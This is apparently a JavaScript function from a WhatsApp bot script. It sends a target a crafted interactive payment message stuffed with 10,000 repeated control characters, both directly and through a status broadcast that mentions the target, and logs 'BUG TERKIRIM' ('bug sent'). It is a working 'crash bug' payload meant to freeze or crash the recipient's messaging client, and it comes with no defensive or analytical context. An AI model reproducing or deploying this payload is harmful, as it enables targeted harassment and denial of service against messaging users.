async function mikirKidz(sock, target) {
  try {
    let message = {
      interactiveMessage: {
        body: { text: "X" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(
                0x2710
              )},\"payment_timestamp\":null,\"share_payment_status\":true}`,
            },
          ],
          messageParamsJson: "{}",
        },
      },
    };

    for (let iterator = 0; iterator < 1; iterator++) {
      const msg = generateWAMessageFromContent(target, message, {});

      await sock.relayMessage(target, msg.message, {
        additionalNodes: [
          { tag: "biz", attrs: { native_flow_name: "payment_method" } },
        ],
        messageId: msg.key.id,
        participant: { jid: target },
        userJid: target,
      });

      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: { native_flow_name: "payment_method" },
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined,
                  },
                ],
              },
            ],
          },
        ],
      });

      await new Promise((resolve) => setTimeout(resolve, 500));
    }

    console.log("BUG TERKIRIM");
  } catch (err) {
    console.error(calik.red.bold(err));
  }
}
